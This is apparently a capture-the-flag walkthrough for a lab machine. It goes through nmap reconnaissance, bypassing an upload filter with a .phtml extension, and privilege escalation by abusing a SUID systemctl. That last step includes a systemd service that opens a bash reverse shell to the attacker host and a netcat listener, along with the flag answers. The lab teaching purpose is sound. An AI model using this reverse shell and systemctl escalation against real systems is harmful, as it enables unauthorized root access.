# Reconnaissance

### Scan the box, how many ports are open?
```
┌──(root💀kali)-[~]
└─# nmap -Pn <machine ip>
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
...
```
> *Answer:* 6

### What version of the squid proxy is running on the machine?
```
┌──(root💀kali)-[~]
└─# nmap -sV <machine ip>
...
3128/tcp open  http-proxy  Squid http proxy 3.5.12
...
```
> *Answer:* 3.5.12

### How many ports will nmap scan if the flag -p-400 was used?
> *Answer:* 400

### Using the nmap flag -n what will it not resolve?
> *Answer:* DNS

### What is the most likely operating system this machine is running?
```
┌──(root💀kali)-[~]
└─# nmap -sV -O <machine ip>
...
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
...
```
> *Answer:* Ubuntu

### What port is the web server running on?
```
┌──(root💀kali)-[~]
└─# nmap -sV <machine ip>
...
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
...
```
> *Answer:* 3333


<br><br>
# Locating directories

### What is the directory that has an upload form page?
```
┌──(root💀kali)-[~]
└─# dirsearch -u "http://<machine ip>:3333/"
...
[14:17:17] 301 -  320B  - /internal  ->  http://10.10.117.6:3333/internal/
...
```
> *Answer:* /internal/


<br><br>
# Compromise the webserver

### Try upload a few file types to the server, what common extension seems to be blocked?
> *Answer:* .php

### Run this attack, what extension is allowed?
> *Answer:* .phtml

### What is the name of the user who manages the webserver?
```
machine:~$ cat /etc/passwd
...
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```
> *Answer:* bill

### What is the user flag?
```
machine:~$ ls -la /home/bill
...
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
machine:~$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```
> *Answer:* 8bd7992fbe8a6ad22a63361004cfcedb


<br><br>
# Privilege Escalation

### On the system, search for all SUID files. What file stands out?
```
machine:~$ find / -perm -u=s -type f | grep -v "Permission denied"
...
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
> *Answer:* /bin/systemctl

### Become root and get the last flag (/root/root.txt)
```
┌──(root💀kali)-[~]
└─# cat > /var/www/html/root.service
[Unit]
Description=PrivEsc

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<kali ip>/8888 0>&1'

[Install]
wantedBy=multi-user.target
*press CRTL+D to save file*

┌──(root💀kali)-[~]
└─# systemctl restart apache2

machine:~$ cd /tmp
machine:~/tmp$ wget <kali ip>/root.service
...
2021-09-19 04:09:25 (32.9 MB/s) - 'root.service' saved [175/175]
machine:~$ /bin/systemctl enable /tmp/root.service
Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
machine:~$ /bin/systemctl start root.service

┌──(root💀kali)-[~]
└─# nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.8.241.141] from (UNKNOWN) [10.10.117.6] 57870
bash: cannot set terminal process group (2040): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```
> *Answer:* a58ff8579f0a9270368d33a9966c7fd5


